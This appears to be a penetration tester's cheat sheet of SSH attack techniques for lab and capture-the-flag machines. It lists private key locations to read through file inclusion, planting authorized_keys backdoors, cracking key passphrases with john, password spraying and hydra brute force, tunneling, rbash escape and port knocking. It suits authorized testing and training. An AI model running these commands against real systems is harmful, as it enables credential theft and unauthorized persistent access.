nmap
```
nmap -p 22 --script=ssh-hostkey,ssh-auth-methods,sshv1 <target-ip>
```

#### Different types and locations:
RSA
- stored on linux at `/home/anita/.ssh/id_rsa`
-  stored on windows at `C:\Users\<Username>\.ssh\id_rsa`
DSA
- stored on linux at `/home/anita/.ssh/id_dsa`
- stored on windows at `C:\Users\<Username>\.ssh\id_dsa`
ecdsa
- stored on linux at `/home/anita/.ssh/id_ecdsa`
- stored on windows at `C:\Users\<Username>\.ssh\id_ecdsa`
ed25519
- stored on linux at `/home/anita/.ssh/id_ed25519`
- stored on windows at `C:\Users\<Username>\.ssh\id_ed25519`

if LFI, check `/etc/ssh/sshd_config` to see ssh key locations

---
#### Use keys from .ssh folder in user's home directory
- make sure `id_rsa.pub` and `authorized_keys` are identical
```
md5sum id_rsa.pub
```
```
md5sum authorized_keys
```
- if hash is identical, transfer `id_rsa` file (not the .pub) to home machine and ssh in without password

---
#### Generate ssh key pair
```
ssh-keygen -t rsa -f ./dank_rsa
```
- key will be saved as `dank_rsa` (private key) and `dank_rsa.pub` (public key) in the current directory (`./`)
- rename `dank_rsa.pub` as `authorized_keys` and upload to target machine in `~/.ssh/` folder on the machine I want to SSH into
```
ssh user_on_target_machine@192.168.198.249 -p 25022 -i dank_rsa
```
- user must be on target machine in the home folder that contains .ssh
- `-p` for alternate port (without `-p` default is 22)
##### If already connected, just copy contents of .pub
copying the contents to the `authorized_keys` file on remote machine:
```
cat dank_rsa.pub
```
- copy entire output and use in `echo` command below
on remote machine in the `/home/username` directory:
```
mkdir .ssh && cd .ssh
```
```
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEqwSCwB7vK26CckpfDL1D0+/z6sf42jocBMLUsbca+m kali@kali" > authorized_keys
```
- change `kali@kali` to my kali user and computer name
- run command on my kali machine:
```
ssh -i id_ed25519 matt@pilgrimage.htb
```

###### Generating rsa ssh keys in /var/www if only have www-data shell on target machine:
```
cd /var/www
```
```
mkdir .ssh
```
```
ssh-keygen -q -t rsa -N '' -C 'pam'
```
```
cp .ssh/id_rsa.pub .ssh/authorized_keys
```
```
chmod 600 .ssh/authorized_keys 
```
- then, copy private key to local host machine
```
ssh -i id_rsa www-data@10.10.10.6
```
- run from kali
---
#### Crack a private key:
- get id_ecdsa on local machine. can copy contents of private key from target if needed:
	- set correct permissions
		- `chmod 600 id_ecdsa`
```
ssh2john id_ecdsa > anita.hash
```
```
john --wordlist=/usr/share/wordlists/rockyou.txt anita.hash
```
- returns password
```
ssh -i ./id_ecdsa anita@192.168.164.245 -p 2222
```

---
#### spray
```
nxc ssh ip -u user -p pass
```

---
#### bruteforce
```
hydra -l offsec -P /usr/share/wordlists/rockyou.txt ssh://192.168.203.122 -V
```

```
hydra -l alfredo -e nsr 192.168.152.249 ssh
```
- checks null passwords, username as password, and reverse of username as password
---
#### ssh tunneling aka port forwarding:
```
ssh -L [local_port]:127.0.0.1:[remote_port] [username]@[remote_host]
```
- if port forward is blocked `channel 3: open failed: administratively prohibited: open failed` use proxychains instead:
	- add `socks4Â  127.0.0.1 8081` to `/etc/proxychains4.conf` in kali
	- `ssh charix@10.129.1.254 -D 8081` run from kali
	- `proxychains vncviewer 127.0.0.1:5901 -passwd secret` run from kali
		- example using vncviewer and password file

---
#### Escape rbash shell with `-t bash`
```
ssh mindy@10.129.226.162 -t bash
```
- `-t bash` instructs ssh to use bash as shell instead of whatever is default assigned in /etc/passwd
- if regular ssh command pops you into a limited -rbash shell, use this

---
#### Port Knocking
`ps -auxww` will show `/usr/sbin/knockd` running
- `cat /etc/knockd.conf` and will see openSSH sequence = 571, 290, 911
	- Put together a script to hit those 3 ports within 5 seconds to open SSH on the host and then connect in:
```
for i in 571 290 911; do
nmap -Pn --host-timeout 100 --max-retries 0 -p $i 10.129.222.16 >/dev/null
done; ssh -i id_rsa amrois@10.129.222.16
```
- might take multiple tries to run this one-liner from bash on kali host
